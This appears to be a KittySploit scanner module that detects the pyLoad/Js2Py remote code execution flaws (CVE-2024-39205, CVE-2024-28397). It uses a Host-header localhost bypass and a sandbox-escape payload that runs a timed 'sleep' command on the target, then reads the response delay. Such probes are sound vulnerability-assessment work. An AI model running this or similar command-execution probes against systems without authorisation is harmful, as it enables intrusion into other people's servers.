#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import time

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.js2py_pyload import (
    build_js2py_cve_2024_28397_payload,
    flash_addcrypted2_path,
    pyload_addcrypted_expected_failure,
    random_crypted_b64,
)


class Module(Scanner, Http_client):

    __info__ = {
        "name": "Pyload Js2Py RCE detection (CVE-2024-39205 / CVE-2024-28397)",
        "description": (
            "Sends a timed sleep via POST /flash/addcrypted2 with a Host: 127.0.0.1:<port> bypass "
            "and a CVE-2024-28397 Js2Py sandbox-escape payload. Vulnerable hosts exhibit a delayed "
            "response consistent with command execution."
        ),
        "author": [
            "Marven11",
            "Ali Sünbül (xeloxa)",
            "KittySploit Team",
        ],
        "severity": "critical",
        "cve": "CVE-2024-39205",
        "references": [
            "https://github.com/Marven11/CVE-2024-39205-Pyload-RCE",
            "https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape",
            "https://github.com/advisories/GHSA-w7hq-f2pj-c53g",
        ],
        "modules": [
            "exploits/linux/http/pyload_js2py_rce_cve_2024_39205",
        ],
        "tags": ["web", "scanner", "pyload", "js2py", "cve-2024-39205", "cve-2024-28397"],
    }

    port = OptPort(9666, "Pyload HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    host_header = OptString(
        "127.0.0.1",
        "Host header for localhost bypass (port appended automatically)",
        required=False,
        advanced=True,
    )

    def _headers(self):
        hp = str(self.host_header or "127.0.0.1").strip() or "127.0.0.1"
        return {"Host": f"{hp}:{int(self.port)}"}

    def run(self):
        sleep_time = random.randint(5, 10)
        js = build_js2py_cve_2024_28397_payload(f"sleep {sleep_time}")
        path = flash_addcrypted2_path(str(self.path or "/"))
        post_data = {"crypted": random_crypted_b64(), "jk": js}

        start = time.monotonic()
        try:
            resp = self.http_request(
                method="POST",
                path=path,
                data=post_data,
                headers=self._headers(),
                allow_redirects=False,
                timeout=float(sleep_time + 25),
            )
        except requests.exceptions.Timeout:
            elapsed = time.monotonic() - start
            if elapsed >= sleep_time - 0.75:
                self.set_info(
                    severity="critical",
                    cve="CVE-2024-39205",
                    reason=(
                        f"Delayed response (~{elapsed:.1f}s) for sleep {sleep_time}s via "
                        "/flash/addcrypted2 + Js2Py escape — likely vulnerable"
                    ),
                )
                return True
            return False
        except requests.exceptions.RequestException as e:
            print_error(f"Probe failed: {e}")
            return False

        elapsed = time.monotonic() - start
        ok_body = resp and pyload_addcrypted_expected_failure(resp.text, resp.status_code)

        if ok_body and elapsed >= sleep_time - 0.75:
            self.set_info(
                severity="critical",
                cve="CVE-2024-39205",
                reason=(
                    f"HTTP 500 Pyload error page after ~{elapsed:.1f}s "
                    f"(sleep {sleep_time}s) — likely CVE-2024-39205 / CVE-2024-28397"
                ),
            )
            return True

        return False
